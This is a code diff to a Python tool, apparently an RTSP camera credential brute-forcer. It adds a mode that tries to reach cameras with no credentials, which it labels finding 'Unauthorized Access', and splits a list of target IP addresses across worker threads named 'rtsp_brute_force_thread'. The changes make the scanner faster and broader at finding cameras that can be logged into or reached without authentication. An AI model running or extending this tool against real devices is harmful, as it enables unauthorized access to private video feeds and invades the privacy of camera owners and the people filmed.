@@ -43,7 +43,10 @@ def stdout_nil():
 def loginRTSP(ip, user, password):
     try:
         with stdout_nil:
-            video_capture = cv2.VideoCapture(f"rtsp://{user}:{password}@{ip}")
+            if user == '':
+                video_capture = cv2.VideoCapture(f"rtsp://{ip}")
+            else:
+                video_capture = cv2.VideoCapture(f"rtsp://{user}:{password}@{ip}")
         if video_capture.isOpened():
             return True
         else:
@@ -73,6 +76,7 @@ if __name__ == "__main__":
     if not arguments.user:
         display('*', f"No {Back.MAGENTA}USER{Back.RESET} Specified")
         display(':', f"Trying to Find {Back.MAGENTA}Unauthorized Access{Back.RESET}")
+        arguments.user = ''
     else:
         arguments.user = quote(arguments.user)
     if not arguments.password:
@@ -102,5 +106,15 @@ if __name__ == "__main__":
             display('-', f"File {Back.YELLOW}{ip_file}{Back.RESET} not Found!")
         except:
             display('-', f"Error while reading File {Back.YELLOW}{ip_file}{Back.RESET}")
+    total_ips = len(ips)
     display('+', "Loaded IP Addresses from Files")
-    display(':', f"Total Number of IP Addresses = {Back.MAGENTA}{len(ips)}{Back.RESET}")
+    display(':', f"Total Number of IP Addresses = {Back.MAGENTA}{total_ips}{Back.RESET}")
+    display(':', f"Creating {Back.MAGENTA}{arguments.threads}{Back.RESET}", start='\n')
+    ip_division = [ips[group*total_ips//arguments.threads:(group+1)*total_ips//arguments.threads] for group in range(arguments.threads)]
+    display('+', f"Created {Back.MAGENTA}{arguments.threads}{Back.RESET}")
+    display(':', f"Starting {Back.MAGENTA}{arguments.threads}{Back.RESET}", start='\n')
+    threads = []
+    for thread_index, ip_group in enumerate(ip_division):
+        threads.append(Thread(name=f"rtsp_brute_force_thread_{thread_index}", target=loginHandler, args=(ip_group, arguments.user, arguments.password, arguments.verbose,)))
+        threads[-1].start()
+    display(':', f"Started All {Back.MAGENTA}{arguments.threads}{Back.RESET}")
